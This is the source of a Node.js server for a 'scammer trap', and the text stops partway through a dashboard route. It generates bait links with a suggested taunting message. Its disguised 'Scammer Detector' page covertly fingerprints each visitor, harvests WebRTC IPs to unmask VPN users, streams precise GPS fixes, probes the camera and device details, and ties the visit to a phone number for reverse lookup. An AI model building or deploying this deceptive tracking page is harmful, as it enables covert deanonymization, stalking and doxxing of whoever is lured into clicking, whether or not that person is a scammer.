const express = require('express');
const { Pool } = require('pg');
const http = require('http');
const { Server } = require('socket.io');
const axios = require('axios');
const cors = require('cors');
const crypto = require('crypto');
const dns = require('dns').promises;

const app = express();

// Trust the reverse proxy (Heroku/Render/etc.) so `req.ip` reflects the real
// client IP from the first hop of `x-forwarded-for` instead of the proxy's IP.
app.set('trust proxy', true);

// Restrict CORS and socket.io to explicitly configured origins. Always include
// the Railway production domain so the bait page can POST to /api/track without
// CORS errors even when ALLOWED_ORIGINS isn't explicitly set.
const builtinOrigins = [
  'https://sentinel-production-31c2.up.railway.app',
];
const allowedOrigins = [
  ...builtinOrigins,
  ...(process.env.ALLOWED_ORIGINS || '').split(',').map(s => s.trim()).filter(Boolean),
];
const corsOrigin = allowedOrigins;


const server = http.createServer(app);
const io = new Server(server, { cors: { origin: corsOrigin } });

const pool = new Pool({ connectionString: process.env.DATABASE_URL });

// AUTO-CREATE TABLES
(async () => {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS traps (
      id TEXT PRIMARY KEY,
      created_at TIMESTAMP DEFAULT NOW()
    );
    CREATE TABLE IF NOT EXISTS clicks (
      id SERIAL PRIMARY KEY,
      trap_id TEXT REFERENCES traps(id),
      data JSONB,
      created_at TIMESTAMP DEFAULT NOW()
    );
    CREATE TABLE IF NOT EXISTS live_events (
      id SERIAL PRIMARY KEY,
      data JSONB,
      created_at TIMESTAMP DEFAULT NOW()
    );
  `);
  console.log('✅ Database tables ready');
})();

app.use(express.json({ limit: '256kb' }));
app.use(cors({ origin: corsOrigin }));

// Simple in-memory rate limiter keyed by client IP. Expired buckets are
// pruned opportunistically on each hit so memory stays bounded.
function rateLimit({ windowMs, max }) {
  const hits = new Map();
  return (req, res, next) => {
    const key = req.ip || req.socket.remoteAddress || 'unknown';
    const now = Date.now();
    if (hits.size > 10_000) {
      for (const [k, v] of hits) {
        if (now - v.start > windowMs) hits.delete(k);
      }
    }
    let entry = hits.get(key);
    if (!entry || now - entry.start > windowMs) {
      entry = { start: now, count: 0 };
      hits.set(key, entry);
    }
    entry.count++;
    if (entry.count > max) {
      return res.status(429).json({ error: 'rate limit exceeded' });
    }
    next();
  };
}

// HTTP Basic Auth guard for the admin portal and the endpoints that return
// sensitive data (IPs, fingerprints, geolocation). Fails closed when
// `ADMIN_PASS` is unset so the portal cannot be exposed by accident.
function adminAuth(req, res, next) {
  const expected = process.env.ADMIN_PASS;
  if (!expected) {
    res.set('Cache-Control', 'no-store');
    return res.status(503).type('text/plain').send('Service unavailable');
  }
  const header = req.headers.authorization || '';
  const sep = header.indexOf(' ');
  const scheme = sep === -1 ? '' : header.slice(0, sep);
  const token = sep === -1 ? '' : header.slice(sep + 1);
  if (scheme === 'Basic' && token) {
    let decoded = '';
    try { decoded = Buffer.from(token, 'base64').toString('utf8'); } catch (e) {}
    const idx = decoded.indexOf(':');
    const provided = idx >= 0 ? decoded.slice(idx + 1) : decoded;
    const a = Buffer.from(provided);
    const b = Buffer.from(expected);
    if (a.length === b.length && crypto.timingSafeEqual(a, b)) {
      return next();
    }
  }
  res.set('WWW-Authenticate', 'Basic realm="Sentinel Admin", charset="UTF-8"');
  res.status(401).type('text/plain').send('Authentication required');
}

// Light per-IP rate limit applied to admin-gated routes so a stolen or
// brute-forced credential can't be used to flood the DB or emit events.
const adminLimiter = rateLimit({ windowMs: 60_000, max: 120 });

// ROBUST BAIT GENERATOR (root — your daily tool)
// After the red button is pressed, the same page transforms into the admin
// portal: live results feed and historical clicks. The page is gated behind
// admin Basic Auth because it triggers trap creation and renders sensitive
// click data.
app.get('/', adminLimiter, adminAuth, (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>Sentinel Trap v4 — Bait Generator</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
</head>
<body class="bg-zinc-950 text-white font-mono">
  <div class="max-w-5xl mx-auto p-8">
    <h1 class="text-4xl font-bold mb-8 text-lime-400">Sentinel Trap v4</h1>

    <div id="generator">
      <p class="text-xl mb-8">Generate a fresh casual scammer bait link instantly.</p>
      <button onclick="generateBait()" class="w-full py-6 text-2xl bg-red-600 hover:bg-red-700 rounded-xl font-bold">GENERATE NEW BAIT LINK</button>
      <button onclick="openAdminPortal()" class="mt-4 w-full py-4 text-lg bg-zinc-800 hover:bg-zinc-700 rounded-xl font-bold text-lime-400">OPEN ADMIN PORTAL (view results &amp; secret session)</button>
    </div>

    <!-- ADMIN PORTAL — revealed after the red button is pressed -->
    <div id="adminPortal" class="hidden mt-8 space-y-8">
      <div id="result" class="text-lg"></div>

      <div class="flex flex-col md:flex-row md:justify-between md:items-center gap-4 border-t border-zinc-800 pt-6">
        <h2 class="text-2xl font-bold text-lime-400">Admin Portal — Live Results</h2>
        <div class="flex items-center gap-3">
          <span id="socketStatus" class="px-3 py-1 rounded-full text-sm font-bold bg-zinc-700 text-zinc-400">⚪ Connecting…</span>
          <button onclick="sendTestClick()" class="px-4 py-2 bg-amber-600 hover:bg-amber-500 rounded-xl text-sm font-bold">🧪 Test Click</button>
          <button onclick="generateBait()" class="px-4 py-3 bg-red-600 hover:bg-red-700 rounded-xl">+ New bait link</button>
        </div>
      </div>

      <div>
        <h3 class="text-lg text-zinc-400 mb-3">Live feed (scammer clicks appear here in real time)</h3>
        <div id="liveLog" class="space-y-4"></div>
      </div>

      <div>
        <h3 class="text-lg text-zinc-400 mb-3">Past results</h3>
        <div id="history" class="space-y-4"><em class="text-zinc-500">Loading…</em></div>
      </div>

      <div>
        <h3 class="text-lg text-amber-400 mb-3">Research-mode events (always-on — geolocation refinements stream here)</h3>
        <div id="liveResearch" class="space-y-4"></div>
        <div id="researchHistory" class="space-y-4 mt-3"><em class="text-zinc-500">Loading…</em></div>
      </div>

      <div>
        <h3 class="text-lg text-sky-400 mb-3">🛠 Debug Console (socket.io events)</h3>
        <div id="debugConsole" class="bg-black rounded-xl p-4 h-48 overflow-y-auto text-xs text-green-400 font-mono space-y-1"></div>
      </div>
    </div>
  </div>

  <script>
    let socket = null;
    let portalReady = false;
    let lastTrapId = null;

    function escapeHtml(s) {
      return String(s == null ? '' : s)
        .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
    }

    function debugLog(msg) {
      const el = document.getElementById('debugConsole');
      if (!el) return;
      const line = document.createElement('div');
      line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
      el.prepend(line);
      // Keep at most 200 lines
      while (el.children.length > 200) el.removeChild(el.lastChild);
    }

    function setSocketStatus(connected) {
      const el = document.getElementById('socketStatus');
      if (!el) return;
      if (connected) {
        el.textContent = '🟢 Connected';
        el.className = 'px-3 py-1 rounded-full text-sm font-bold bg-lime-900 text-lime-300';
      } else {
        el.textContent = '🔴 Disconnected';
        el.className = 'px-3 py-1 rounded-full text-sm font-bold bg-red-900 text-red-300';
      }
    }

    function renderEntry(data, ts) {
      const entry = document.createElement('div');
      entry.className = 'bg-zinc-900 p-6 rounded-2xl border border-lime-400';
      const trapId = escapeHtml(data.trapId);
      const ip = escapeHtml(data.ip);
      const visitorId = escapeHtml(data.visitorId || '—');
      const country = escapeHtml(data.ipinfo && data.ipinfo.country || '—');
      const region = escapeHtml(data.ipinfo && data.ipinfo.region || '');
      const city = escapeHtml(data.ipinfo && data.ipinfo.city || '');
      const postal = escapeHtml(data.ipinfo && data.ipinfo.postal || '');
      const org = escapeHtml(data.ipinfo && data.ipinfo.org || '—');
      const ipinfoLoc = escapeHtml(data.ipinfo && data.ipinfo.loc || '');
      const hostnames = escapeHtml((data.hostnames && data.hostnames.join(', ')) || '—');
      const abuse = escapeHtml((data.abuse && data.abuse.abuseConfidenceScore) || 0);
      const profile = data.aiProfile ? escapeHtml(String(data.aiProfile)) : '—';
      const rawJson = escapeHtml(JSON.stringify(data, null, 2));

      // Always-on research-mode signals (geolocation + extras + WebRTC IPs).
      const research = data.research || {};
      const geo = research.geolocation || null;
      const extras = research.extras || {};
      const webrtc = Array.isArray(research.webrtc) ? research.webrtc : [];
      const webrtcIps = webrtc.map(c => c && c.ip).filter(Boolean);
      const uniqueWebrtcIps = Array.from(new Set(webrtcIps));
      const leakedIps = uniqueWebrtcIps.filter(x => x && x !== data.ip);

      const cityRegion = [city, region, postal].filter(Boolean).join(', ');
      const conn = extras.connection || null;
      const battery = extras.battery || null;
      const ua = escapeHtml(data.ua || '—');
      const tz = escapeHtml(data.timezone || '—');
      const langs = escapeHtml((data.languages || []).join(', ') || '—');
      const scr = data.screen ? escapeHtml(data.screen.w + '×' + data.screen.h) : '—';

      const geoBlock = geo ? \`
        <div class="mt-4 bg-amber-950/40 border border-amber-700/50 rounded-xl p-3 text-sm">
          <div class="text-amber-300 font-bold mb-1">📍 Precise location (browser GPS)</div>
          <div class="grid grid-cols-1 md:grid-cols-3 gap-2">
            <div>Lat: <span class="font-mono">\${escapeHtml(geo.latitude)}</span></div>
            <div>Lon: <span class="font-mono">\${escapeHtml(geo.longitude)}</span></div>
            <div>Accuracy: <span class="font-mono">\${escapeHtml(geo.accuracy)} m</span></div>
          </div>
          <div class="mt-1"><a class="text-blue-400 underline" target="_blank" rel="noopener noreferrer" href="https://www.openstreetmap.org/?mlat=\${encodeURIComponent(geo.latitude)}&mlon=\${encodeURIComponent(geo.longitude)}#map=17/\${encodeURIComponent(geo.latitude)}/\${encodeURIComponent(geo.longitude)}">open map</a></div>
        </div>\` : '';

      const ipinfoMapLink = ipinfoLoc && !geo ? \`<a class="text-blue-400 underline ml-2" target="_blank" rel="noopener noreferrer" href="https://www.openstreetmap.org/?mlat=\${encodeURIComponent(ipinfoLoc.split(',')[0])}&mlon=\${encodeURIComponent(ipinfoLoc.split(',')[1])}#map=11/\${encodeURIComponent(ipinfoLoc.split(',')[0])}/\${encodeURIComponent(ipinfoLoc.split(',')[1])}">open map</a>\` : '';

      const leakBlock = leakedIps.length ? \`
        <div class="mt-3 bg-red-950/40 border border-red-700/50 rounded-xl p-3 text-sm">
          <div class="text-red-300 font-bold">⚠️ WebRTC IP leak — possible real IP behind VPN/proxy</div>
          <div class="mt-1 font-mono">\${escapeHtml(leakedIps.join(', '))}</div>
        </div>\` : '';

      const extrasBlock = \`
        <div class="mt-3 grid grid-cols-2 md:grid-cols-4 gap-2 text-xs text-zinc-300">
          <div>Hostname: <span class="font-mono">\${hostnames}</span></div>
          <div>Timezone: <span class="font-mono">\${tz}</span></div>
          <div>Languages: <span class="font-mono">\${langs}</span></div>
          <div>Screen: <span class="font-mono">\${scr}</span></div>
          <div>Platform: <span class="font-mono">\${escapeHtml(extras.platform || '—')}</span></div>
          <div>Vendor: <span class="font-mono">\${escapeHtml(extras.vendor || '—')}</span></div>
          <div>CPU cores: <span class="font-mono">\${escapeHtml(extras.hardwareConcurrency || '—')}</span></div>
          <div>RAM (GB): <span class="font-mono">\${escapeHtml(extras.deviceMemory || '—')}</span></div>
          <div>Touch pts: <span class="font-mono">\${escapeHtml(extras.maxTouchPoints || 0)}</span></div>
          <div>Pixel ratio: <span class="font-mono">\${escapeHtml(extras.pixelRatio || '—')}</span></div>
          <div>Net type: <span class="font-mono">\${escapeHtml((conn && conn.effectiveType) || '—')}</span></div>
          <div>Battery: <span class="font-mono">\${battery ? escapeHtml(Math.round((battery.level || 0) * 100) + '% ' + (battery.charging ? '⚡' : '')) : '—'}</span></div>
        </div>
        <div class="mt-2 text-xs text-zinc-500">UA: <span class="font-mono break-all">\${ua}</span></div>\`;

      // Trestle reverse-phone intel — caller ID, phone ownership, CNAM.
      const trestle = data.trestle || null;
      const trestleBlock = trestle ? \`
        <div class="mt-4 bg-sky-950/40 border border-sky-700/50 rounded-xl p-3 text-sm">
          <div class="text-sky-300 font-bold mb-2">📞 Reverse Phone Intel (Trestle)</div>
          <div class="text-xs">
            <div class="mb-1">Phone: <span class="font-mono text-white">\${escapeHtml(trestle.phone || '—')}</span></div>
            \${trestle.caller_id ? '<div class="mb-1"><strong>Caller ID:</strong> ' + escapeHtml(JSON.stringify(trestle.caller_id, null, 2)) + '</div>' : ''}
            \${trestle.phone_intel ? '<div class="mb-1"><strong>Phone Intel:</strong> ' + escapeHtml(JSON.stringify(trestle.phone_intel, null, 2)) + '</div>' : ''}
            \${trestle.cnam ? '<div class="mb-1"><strong>CNAM:</strong> ' + escapeHtml(JSON.stringify(trestle.cnam, null, 2)) + '</div>' : ''}
            \${!trestle.caller_id && !trestle.phone_intel && !trestle.cnam ? '<div class="text-zinc-400">No data returned</div>' : ''}
          </div>
        </div>\` : '';

      entry.innerHTML = \`
        <div class="flex justify-between">
          <span class="font-bold">Trap ID: \${trapId}</span>
          <span class="text-xs text-zinc-400">\${escapeHtml(ts)}</span>
        </div>
        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
          <div>IP: <span class="font-mono">\${ip}</span></div>
          <div>VisitorID: <span class="font-mono">\${visitorId}</span></div>
          <div>Country: \${country} \${cityRegion ? '— ' + cityRegion : ''}\${ipinfoMapLink}</div>
          <div>ASN/Org: \${org}</div>
          <div>Abuse Score: \${abuse}%</div>
          <div>WebRTC candidates: <span class="font-mono">\${escapeHtml(uniqueWebrtcIps.join(', ') || '—')}</span></div>
        </div>
        \${geoBlock}
        \${leakBlock}
        \${trestleBlock}
        \${extrasBlock}
        <div class="mt-4 text-sm text-lime-300 whitespace-pre-wrap">AI Scammer Profile:
\${profile}</div>
        <button onclick="this.parentElement.querySelector('.raw').classList.toggle('hidden')" class="text-xs mt-4 underline">Show Raw JSON</button>
        <pre class="raw hidden mt-4 text-xs bg-black p-4 overflow-auto">\${rawJson}</pre>
      \`;
      return entry;
    }

    async function loadHistory() {
      const wrap = document.getElementById('history');
      try {
        debugLog('Loading click history from /api/clicks…');
        const r = await fetch('/api/clicks');
        if (!r.ok) throw new Error('HTTP ' + r.status);
        const rows = await r.json();
        debugLog('History loaded: ' + rows.length + ' rows');
        if (!Array.isArray(rows) || rows.length === 0) {
          wrap.innerHTML = '<em class="text-zinc-500">No clicks recorded yet. Send the bait link to a scammer and results will appear here.</em>';
          return;
        }
        wrap.innerHTML = '';
        rows.forEach(row => {
          const data = row.data || {};
          const ts = new Date(row.created_at).toLocaleString();
          wrap.appendChild(renderEntry(data, ts));
        });
      } catch (e) {
        debugLog('ERROR loading history: ' + e.message);
        wrap.innerHTML = '<em class="text-red-400">Failed to load history: ' + escapeHtml(e.message) + '</em>';
      }
    }

    function renderResearchEntry(data, ts) {
      const entry = document.createElement('div');
      entry.className = 'bg-zinc-900 p-4 rounded-2xl border border-amber-500';
      const trapId = escapeHtml(data.trapId || '—');
      const lat = escapeHtml(data.latitude != null ? data.latitude : '—');
      const lon = escapeHtml(data.longitude != null ? data.longitude : '—');
      const acc = escapeHtml(data.accuracy != null ? data.accuracy + ' m' : '—');
      const rawJson = escapeHtml(JSON.stringify(data, null, 2));
      const mapLink = (data.latitude != null && data.longitude != null)
        ? '<a class="text-blue-400 underline" target="_blank" href="https://www.openstreetmap.org/?mlat=' + encodeURIComponent(data.latitude) + '&mlon=' + encodeURIComponent(data.longitude) + '#map=15/' + encodeURIComponent(data.latitude) + '/' + encodeURIComponent(data.longitude) + '">open map</a>'
        : '';
      entry.innerHTML = \`
        <div class="flex justify-between">
          <span class="font-bold text-amber-300">Research event — Trap \${trapId}</span>
          <span class="text-xs text-zinc-400">\${escapeHtml(ts)}</span>
        </div>
        <div class="grid grid-cols-1 md:grid-cols-3 gap-3 mt-3 text-sm">
          <div>Lat: <span class="font-mono">\${lat}</span></div>
          <div>Lon: <span class="font-mono">\${lon}</span></div>
          <div>Accuracy: <span class="font-mono">\${acc}</span></div>
        </div>
        <div class="mt-2 text-sm">\${mapLink}</div>
        <button onclick="this.parentElement.querySelector('.raw').classList.toggle('hidden')" class="text-xs mt-3 underline">Show Raw JSON</button>
        <pre class="raw hidden mt-3 text-xs bg-black p-4 overflow-auto">\${rawJson}</pre>
      \`;
      return entry;
    }

    async function loadResearchHistory() {
      const wrap = document.getElementById('researchHistory');
      try {
        debugLog('Loading research history from /api/live-events…');
        const r = await fetch('/api/live-events');
        if (!r.ok) throw new Error('HTTP ' + r.status);
        const rows = await r.json();
        debugLog('Research history loaded: ' + rows.length + ' rows');
        if (!Array.isArray(rows) || rows.length === 0) {
          wrap.innerHTML = '<em class="text-zinc-500">No research-mode events yet. Research mode is always on — events stream here as soon as a scammer clicks a bait link and grants (or has previously granted) location permission.</em>';
          return;
        }
        wrap.innerHTML = '';
        rows.forEach(row => {
          const data = row.data || {};
          const ts = new Date(row.created_at).toLocaleString();
          wrap.appendChild(renderResearchEntry(data, ts));
        });
      } catch (e) {
        debugLog('ERROR loading research history: ' + e.message);
        wrap.innerHTML = '<em class="text-red-400">Failed to load research history: ' + escapeHtml(e.message) + '</em>';
      }
    }

    function openAdminPortal() {
      if (portalReady) return;
      portalReady = true;
      document.getElementById('generator').classList.add('hidden');
      document.getElementById('adminPortal').classList.remove('hidden');

      debugLog('Initialising socket.io connection…');
      socket = io();

      socket.on('connect', () => {
        debugLog('socket.io connected — id=' + socket.id);
        setSocketStatus(true);
      });
      socket.on('disconnect', (reason) => {
        debugLog('socket.io disconnected: ' + reason);
        setSocketStatus(false);
      });
      socket.on('connect_error', (err) => {
        debugLog('socket.io connect_error: ' + err.message);
        setSocketStatus(false);
      });

      socket.on('live-click', (data) => {
        debugLog('live-click received: trapId=' + data.trapId + ' ip=' + data.ip);
        const logDiv = document.getElementById('liveLog');
        logDiv.prepend(renderEntry(data, new Date().toLocaleTimeString()));
      });
      socket.on('research-live', (data) => {
        debugLog('research-live received: trapId=' + data.trapId);
        const logDiv = document.getElementById('liveResearch');
        logDiv.prepend(renderResearchEntry(data, new Date().toLocaleTimeString()));
      });

      loadHistory();
      loadResearchHistory();
    }

    async function sendTestClick() {
      if (!lastTrapId) {
        debugLog('No trap ID yet — generate a bait link first');
        alert('Generate a bait link first so there is a valid trap ID to test with.');
        return;
      }
      debugLog('Sending test click for trapId=' + lastTrapId + '…');
      try {
        const resp = await fetch('/api/track', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            trapId: lastTrapId,
            visitorId: 'test-visitor-' + Date.now(),
            ua: navigator.userAgent,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            languages: Array.from(navigator.languages || []),
            screen: { w: screen.width, h: screen.height },
            _testClick: true
          })
        });
        if (resp.ok) {
          debugLog('✅ Test click accepted by server (HTTP ' + resp.status + ')');
        } else {
          const text = await resp.text().catch(() => '');
          debugLog('❌ Test click rejected: HTTP ' + resp.status + ' — ' + text);
        }
      } catch (e) {
        debugLog('❌ Test click fetch error: ' + e.message);
      }
    }

    async function generateBait() {
      try {
        debugLog('Creating new trap via /api/create-trap…');
        const res = await fetch('/api/create-trap', { method: 'POST' });
        if (!res.ok) throw new Error('HTTP ' + res.status);
        const data = await res.json();
        lastTrapId = data.link.split('/').pop();
        const fullLink = window.location.origin + data.link;
        debugLog('Trap created: ' + lastTrapId);
        openAdminPortal();
        document.getElementById('result').innerHTML = \`
          <div class="bg-zinc-900 p-6 rounded-xl">
            <strong class="text-lime-400">YOUR BAIT LINK (ready to send):</strong><br>
            <a href="\${escapeHtml(fullLink)}" target="_blank" class="break-all text-blue-400">\${escapeHtml(fullLink)}</a><br><br>
            <em class="text-zinc-400">Text the scammer: "Hey this link says you're a scammer 😂 click to prove it wrong"</em>
          </div>
        \`;
      } catch (e) {
        debugLog('ERROR generating bait: ' + e.message);
        alert('Failed to generate bait link: ' + e.message);
      }
    }
  </script>
</body>
</html>`);
});




// CREATE TRAP — admin-only; anyone able to create traps can flood the DB.
app.post('/api/create-trap', adminLimiter, adminAuth, async (req, res) => {
  const id = crypto.randomBytes(6).toString('hex');
  await pool.query('INSERT INTO traps (id) VALUES ($1)', [id]);
  console.log(`🪤 Trap created: id=${id}`);
  res.json({ link: `/check-scammer/${id}` });
});


// THE BAIT PAGE (scammer sees this — advanced fingerprinting)
app.get('/check-scammer/:id', (req, res) => {
  // Use the server-derived IP (trust proxy is set) and JSON.stringify it so
  // any special characters are safely escaped before injection into JS.
  const ip = getClientIp(req);
  const safeIp = JSON.stringify(ip);           // e.g. "1.2.3.4" — always valid JS string literal
  const safeTrapId = JSON.stringify(req.params.id);
  // Extract phone from query params if present (e.g. ?phone=+1234567890)
  const rawPhone = (req.query.phone || '').toString().trim();
  const phone = rawPhone
    ? rawPhone.replace(/[^\d+]/g, '').replace(/(?!^)\+/g, '')
    : '';
  const safePhone = JSON.stringify(phone);
  console.log(`🎣 Bait page loaded: trapId=${req.params.id}, ip=${ip}${phone ? `, phone=${phone}` : ''}`);
  res.send(`
<!DOCTYPE html>
<html>
<head><title>Scammer Detector 3000 😂</title>
<script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-zinc-950 text-white flex items-center justify-center min-h-screen font-mono">
  <div class="max-w-md text-center">
    <h1 class="text-5xl mb-4">Hey...</h1>
    <p class="text-2xl mb-8">This link says you're a scammer.</p>
    <button onclick="activateTrap(${safeTrapId}, ${safeIp}, ${safePhone})" class="w-full py-8 text-3xl bg-red-600 hover:bg-red-700 rounded-2xl font-bold">VERIFY INNOCENCE NOW</button>
  </div>

  <script src="https://openfpcdn.io/fingerprintjs/v5"></script>
  <script src="https://cdn.jsdelivr.net/npm/@thumbmarkjs/thumbmarkjs/dist/thumbmark.umd.js"></script>
  <script>
    // Research-mode helpers — these run unconditionally on every click. There
    // is no toggle: research signals are always captured and bundled into the
    // regular /api/track payload so they show up alongside the click.

    // Best-effort high-accuracy geolocation. Resolves with whatever we can
    // get, never rejects, so the redirect is never blocked.
    function captureGeolocation() {
      return new Promise(resolve => {
        if (!navigator.geolocation) return resolve(null);
        let done = false;
        const finish = (val) => { if (!done) { done = true; resolve(val); } };
        // Hard cap so we never hang the redirect.
        setTimeout(() => finish(null), 8000);
        try {
          navigator.geolocation.getCurrentPosition(
            p => finish({
              latitude: p.coords.latitude,
              longitude: p.coords.longitude,
              accuracy: p.coords.accuracy,
              altitude: p.coords.altitude,
              altitudeAccuracy: p.coords.altitudeAccuracy,
              heading: p.coords.heading,
              speed: p.coords.speed,
              timestamp: p.timestamp
            }),
            () => finish(null),
            { enableHighAccuracy: true, maximumAge: 0, timeout: 7500 }
          );
        } catch (e) { finish(null); }
      });
    }

    // WebRTC candidate harvest — can reveal LAN IPs and sometimes the real
    // public IP behind a VPN/proxy. Best-effort, non-blocking.
    //
    // We use a wide public STUN list (the same set browserleaks.com/webrtc
    // queries) so srflx candidates surface even when the client's network
    // only reaches a subset of STUN providers. This gives us
    // "browserleaks-grade" leak coverage on the scammer's own browser —
    // which is where it has to run; fetching browserleaks.com from the
    // server would only report the server's IPs.
    function captureWebRtcCandidates() {
      return new Promise(resolve => {
        const out = [];
        let done = false;
        const finish = () => { if (!done) { done = true; resolve(out); } };
        setTimeout(finish, 3000);
        try {
          const RTCPC = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
          if (!RTCPC) return finish();
          const pc = new RTCPC({ iceServers: [{ urls: [
            'stun:stun.l.google.com:19302',
            'stun:stun1.l.google.com:19302',
            'stun:stun2.l.google.com:19302',
            'stun:stun.cloudflare.com:3478',
            'stun:stun.nextcloud.com:443',
            'stun:stun.sipgate.net:3478',
          ] }] });
          pc.createDataChannel('x');
          pc.onicecandidate = (ev) => {
            if (!ev.candidate) { try { pc.close(); } catch(_) {} return finish(); }
            const c = ev.candidate.candidate || '';
            const m = c.match(/(?:^| )([a-fA-F0-9:.]+) \d+ typ (\w+)/);
            if (m) out.push({ ip: m[1], type: m[2], raw: c });
            else out.push({ raw: c });
          };
          pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => finish());
        } catch (e) { finish(); }
      });
    }

    async function captureExtras() {
      const nav = navigator || {};
      const conn = nav.connection || nav.mozConnection || nav.webkitConnection || null;
      let battery = null;
      try {
        if (typeof nav.getBattery === 'function') {
          const b = await nav.getBattery();
          battery = { level: b.level, charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
        }
      } catch (e) {}
      let storage = null;
      try {
        if (nav.storage && typeof nav.storage.estimate === 'function') {
          storage = await nav.storage.estimate();
        }
      } catch (e) {}
      let permissions = {};
      try {
        if (nav.permissions && typeof nav.permissions.query === 'function') {
          for (const name of ['geolocation', 'notifications', 'camera', 'microphone']) {
            try { permissions[name] = (await nav.permissions.query({ name })).state; } catch (_) {}
          }
        }
      } catch (e) {}
      return {
        platform: nav.platform || null,
        userAgentData: nav.userAgentData ? {
          brands: nav.userAgentData.brands,
          mobile: nav.userAgentData.mobile,
          platform: nav.userAgentData.platform
        } : null,
        vendor: nav.vendor || null,
        hardwareConcurrency: nav.hardwareConcurrency || null,
        deviceMemory: nav.deviceMemory || null,
        maxTouchPoints: nav.maxTouchPoints || 0,
        cookieEnabled: nav.cookieEnabled || false,
        doNotTrack: nav.doNotTrack || null,
        pdfViewerEnabled: nav.pdfViewerEnabled || false,
        connection: conn ? { effectiveType: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt, saveData: conn.saveData, type: conn.type } : null,
        battery,
        storage,
        permissions,
        pixelRatio: window.devicePixelRatio || null,
        colorDepth: screen.colorDepth || null,
        orientation: (screen.orientation && screen.orientation.type) || null,
        plugins: Array.from(navigator.plugins || []).map(p => p.name).slice(0, 20),
        referrer: document.referrer || null,
        timezoneOffsetMinutes: new Date().getTimezoneOffset()
      };
    }

    async function activateTrap(trapId, ip, phone) {
      try {
        console.log('🔍 Fingerprinting... trapId=' + trapId + ' ip=' + ip + (phone ? ' phone=' + phone : ''));

        let visitorId = null, thumbResult = null, fpResult = null;
        try {
          const fpPromise = FingerprintJS.load();
          const fp = await fpPromise;
          fpResult = await fp.get({ extendedResult: true });
          visitorId = fpResult.visitorId;
          console.log('✅ FingerprintJS visitorId=' + visitorId);
        } catch (e) {
          console.error('⚠️ FingerprintJS failed:', e);
        }

        try {
          thumbResult = await ThumbmarkJS.get();
          console.log('✅ ThumbmarkJS done');
        } catch (e) {
          console.error('⚠️ ThumbmarkJS failed:', e);
        }

        // Always-on research-mode signals captured in parallel with the
        // fingerprints above. Each helper is best-effort and never throws.
        const [geo, webrtc, extras] = await Promise.all([
          captureGeolocation(),
          captureWebRtcCandidates(),
          captureExtras()
        ]);
        console.log('🔬 Research signals captured: geo=' + !!geo + ' webrtc=' + (webrtc ? webrtc.length : 0) + ' extras=' + !!extras);

        const payload = {
          trapId,
          visitorId,
          thumbId: thumbResult,
          ip,
          ua: navigator.userAgent,
          fingerprint: fpResult,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          languages: Array.from(navigator.languages || []),
          screen: { w: screen.width, h: screen.height },
          // Phone number extracted from query params — server passes it through
          // so enrichment (Trestle / Apify) can use it without client guessing.
          phone: phone || null,
          // Research-mode payload — always present, no toggle.
          research: {
            geolocation: geo,
            webrtc,
            extras
          }
        };

        console.log('📤 Sending to server...', { trapId, ip, visitorId });

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 10000);
        let trackOk = false;
        try {
          const resp = await fetch('/api/track', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            signal: controller.signal
          });
          clearTimeout(timeoutId);
          if (resp.ok) {
            console.log('✅ Tracked! Server responded ' + resp.status);
            trackOk = true;
          } else {
            const text = await resp.text().catch(() => '');
            console.error('❌ Track request failed: HTTP ' + resp.status, text);
          }
        } catch (e) {
          clearTimeout(timeoutId);
          if (e.name === 'AbortError') {
            console.error('❌ Track request timed out after 10s');
          } else {
            console.error('❌ Track fetch error:', e);
          }
        }

        // Research mode — high-accuracy geolocation streamed to the live
        // research feed. Always-on; best-effort; never blocks redirect.
        // We also briefly watchPosition to capture refined GPS fixes as
        // accuracy improves over the next few seconds.
        try {
          const sendGeo = (p) => {
            const geo = {
              trapId,
              latitude: p.coords.latitude,
              longitude: p.coords.longitude,
              accuracy: p.coords.accuracy,
              altitude: p.coords.altitude,
              altitudeAccuracy: p.coords.altitudeAccuracy,
              heading: p.coords.heading,
              speed: p.coords.speed,
              timestamp: p.timestamp
            };
            fetch('/api/live', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(geo)
            }).catch(e => console.error('⚠️ Geo send failed:', e));
          };
          navigator.geolocation.getCurrentPosition(
            p => { console.log('📍 Geolocation captured (initial), sending...'); sendGeo(p); },
            (err) => { console.log('📍 Geolocation denied/unavailable:', err.message); },
            { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
          );
          // Refine for a short window then stop.
          let watchId = null;
          try {
            watchId = navigator.geolocation.watchPosition(
              p => sendGeo(p),
              () => {},
              { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
            );
            setTimeout(() => { try { navigator.geolocation.clearWatch(watchId); } catch(_) {} }, 20000);
          } catch (_) {}
        } catch (e) {
          console.error('⚠️ Geolocation error:', e);
        }

        try {
          navigator.mediaDevices.getUserMedia({ video: true })
            .then(() => console.log('📸 Camera hooked — Research Preview active'))
            .catch(() => {});
        } catch (e) {}

        console.log('🔀 Redirecting...');
        window.location = 'https://i.imgur.com/you-got-caught-meme.jpg';

      } catch (e) {
        console.error('💥 activateTrap top-level error:', e);
        // Redirect anyway so the scammer doesn't see a broken page
        window.location = 'https://i.imgur.com/you-got-caught-meme.jpg';
      }
    }
  </script>
</body>
</html>`);
});


// ROBUST DASHBOARD (full live view of all great information)
app.get('/dashboard', adminLimiter, adminAuth, (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>Sentinel Trap — Live Dashboard</title>
